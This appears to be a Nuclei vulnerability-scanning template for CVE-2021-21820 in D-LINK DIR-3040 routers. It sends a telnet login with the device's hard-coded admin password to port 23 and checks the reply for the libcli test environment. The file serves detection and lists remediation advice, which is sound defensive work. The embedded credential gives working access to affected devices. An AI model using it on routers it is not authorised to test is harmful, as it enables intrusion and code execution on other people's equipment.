id: CVE-2021-21820

info:
  name: D-LINK DIR-3040 Hard-coded Password Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    A hard-coded password vulnerability exists in the Libcli Test Environment functionality of D-LINK DIR-3040 1.13B03, allowing code execution.
  reference:
    - https://talosintelligence.com/vulnerability_reports/TALOS-2021-1285
  tags: hard-coded, password, telnet, CVE-2021-21820
  remediation: |
    To remediate the hard-coded password vulnerability, update the firmware to the latest version provided by D-LINK. Disable unnecessary services such as Telnet and employ strong, unique passwords for all accounts.

tcp:
  - inputs:
      - data: "dlinkrouter login: admin\nPassword: DIRrqtq*@twsz\n"
    host:
      - "{{Hostname}}"
    port: 23
    read-size: 1024

    matchers:
      - type: word
        words:
          - "libcli test environment"
        part: data